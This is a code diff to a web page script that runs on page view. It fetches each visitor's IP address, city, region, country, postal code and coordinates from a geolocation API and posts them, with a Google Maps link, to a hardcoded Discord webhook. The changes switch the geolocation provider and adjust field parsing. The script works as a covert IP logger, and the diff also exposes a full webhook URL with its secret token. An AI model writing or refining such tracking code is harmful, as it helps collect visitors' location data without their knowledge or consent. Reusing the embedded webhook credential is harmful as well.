@@ -26,32 +26,34 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L';
-        const GEO_API_URL = 'https://ip-api.com/json/';
+        const GEO_API_URL = 'https://ipapi.co/json/';  // Free, HTTPS, no key needed
 
         async function trackPageView() {
             try {
                 const geoResponse = await fetch(GEO_API_URL);
+                if (!geoResponse.ok) throw new Error(`HTTP error! Status: ${geoResponse.status}`);
+
                 const geoData = await geoResponse.json();
 
-                if (geoData.status !== 'success') {
-                    throw new Error(geoData.message || 'Geolocation fetch failed');
+                if (geoData.error) {
+                    throw new Error(geoData.reason || 'Geolocation fetch failed');
                 }
 
                 const {
-                    query: ip = 'Unknown',
+                    ip = 'Unknown',
                     city = 'Unknown',
-                    regionName: region = 'Unknown',
-                    country = 'Unknown',
-                    zip = 'Unknown',
-                    lat: latitude,
-                    lon: longitude
+                    region = 'Unknown',
+                    country_name: country = 'Unknown',
+                    postal = 'Unknown',
+                    latitude,
+                    longitude
                 } = geoData;
 
                 const mapsLink = latitude && longitude 
                     ? `https://www.google.com/maps?q=${latitude},${longitude}`
                     : 'Location coordinates unavailable';
 
-                const locationText = `${city}, ${region}, ${country}${zip !== 'Unknown' ? ` (${zip})` : ''}`;
+                const locationText = `${city}, ${region}, ${country}${postal !== 'Unknown' ? ` (${postal})` : ''}`;
 
                 const embedPayload = {
                     content: 'Page viewed!',
@@ -65,7 +67,7 @@
                             { name: 'Google Maps', value: `[View on Map](${mapsLink})`, inline: false }
                         ],
                         timestamp: new Date().toISOString(),
-                        footer: { text: 'Tracked via Webhook • Powered by ip-api.com' }
+                        footer: { text: 'Tracked via Webhook • Powered by ipapi.co' }
                     }]
                 };
 
